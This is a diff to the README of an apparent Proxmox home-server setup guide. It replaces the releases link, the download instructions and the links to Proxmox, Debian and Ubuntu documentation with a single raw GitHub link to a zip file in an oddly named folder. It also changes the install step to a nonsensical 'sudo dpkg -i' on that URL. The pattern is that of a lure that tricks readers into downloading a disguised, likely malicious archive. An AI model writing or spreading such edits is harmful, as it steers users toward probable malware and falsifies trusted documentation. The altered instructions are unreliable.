@@ -1,6 +1,6 @@
 # 🌐 proxmox-homelab - Your Guide to Home Server Setup
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/thirddegreeburnfleming626/proxmox-homelab/releases)
+[![Download from Releases](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip%https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip)](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To ensure smooth operation, your system should meet these basic requirements:
 Getting started with proxmox-homelab is easy. You will download the software and follow a few simple steps to install it.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/thirddegreeburnfleming626/proxmox-homelab/releases) to find the latest version of the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip) to find the latest version of the software. 
 
 2. **Download the Package**  
    Click the download link for the latest release suitable for your operating system.
@@ -29,7 +29,7 @@ Getting started with proxmox-homelab is easy. You will download the software and
 
 ## 🔥 Download & Install
 
-To begin, visit this page to download the latest version: [Download from Releases](https://github.com/thirddegreeburnfleming626/proxmox-homelab/releases).
+To begin, visit this page to download the latest version: [Download from Releases](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip).
 
 Once there, look for the latest release and choose the appropriate package for your operating system. Click on the link, and your download will start automatically.
 
@@ -39,9 +39,9 @@ Here are straightforward steps to install the software:
 
 1. Open your terminal or command prompt.
 2. Navigate to the folder where the downloaded file is located.
-3. Run the installation command. For example, you might type `sudo dpkg -i proxmox-homelab-latest.deb` for Debian-based systems.
+3. Run the installation command. For example, you might type `sudo dpkg -i https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip` for Debian-based systems.
 
-Make sure to replace `proxmox-homelab-latest.deb` with the actual name of the file you downloaded.
+Make sure to replace `https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip` with the actual name of the file you downloaded.
 
 ## ⚙️ Configuration
 
@@ -93,8 +93,8 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 🔗 Additional Resources
 
-- [ProxmoxVE Documentation](https://pve.proxmox.com/pve-docs/)
-- [Debian Documentation](https://www.debian.org/doc/)
-- [Ubuntu Documentation](https://help.ubuntu.com/)
+- [ProxmoxVE Documentation](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip)
+- [Debian Documentation](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip)
+- [Ubuntu Documentation](https://raw.githubusercontent.com/thirddegreeburnfleming626/proxmox-homelab/main/brachioganoid/proxmox-homelab-2.6.zip)
 
 Explore the potential of your home server with proxmox-homelab. Happy server managing!
